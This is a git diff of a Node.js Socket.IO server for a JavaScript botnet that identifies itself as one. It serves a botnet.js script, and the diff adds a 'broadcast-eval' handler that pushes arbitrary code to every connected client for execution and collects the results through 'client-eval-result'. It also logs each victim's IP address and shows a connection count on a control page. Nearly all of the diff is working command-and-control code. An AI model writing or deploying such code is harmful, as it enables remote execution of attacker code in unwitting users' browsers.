@@ -8,11 +8,12 @@ app.set('view engine', 'jsx');
 app.engine('jsx', view);
 
 app.get('/', function (req, res) {
-   res.render('index', { name: "John" }); //help
+   res.render('index', {});
 });
 
 app.get('/control', function (req, res) {
-    res.render('control', {});
+    /// Object.keys(socketIO.connected).length;
+    res.render('control', {connection_count: io.sockets.sockets.length});
 });
 
 app.get('/botnetjs/botnet.js', function (req, res) {
@@ -31,30 +32,17 @@ http.listen(3000, function () {
     console.log('server started');
 });
 
-io.sockets.on('connection', function (socket) {
-    console.log('a user connected');
-    //console.log(socket);
+io.on('connection', function (socket) {
+    console.log('a user connected: ' + socket.conn.remoteAddress);
 
-    //console.dir({ address: socket.conn.remoteAddress});
-/*
-    socket.on('eval', function (data) {
+    socket.on('client-eval-result', function(data) {
+        console.info('client-eval-result: ' + data);
+    });
+
+    socket.on('broadcast-eval', function (data) {
         io.sockets.emit('eval', data);
-        console.log('Alert Request From: ' + socket.conn.remoteAddress);
+        console.log('broadcast-eval: ' + data);
+        console.log('from: ' + socket.conn.remoteAddress);
     });
-*/
-    socket.on('news', function (data) {
-        console.log(data);
-    });
-
-    socket.on('broadcast-news', function (data) {
-       io.sockets.emit('news', data);
-    });
-
-    socket.on('broadcast', function (data) {
-        io.sockets.emit('news', data);
-    });
-
-    socket.emit('news', 'Welcome to the botnet. New connection: ' +
-                socket.conn.remoteAddress);
 });
 
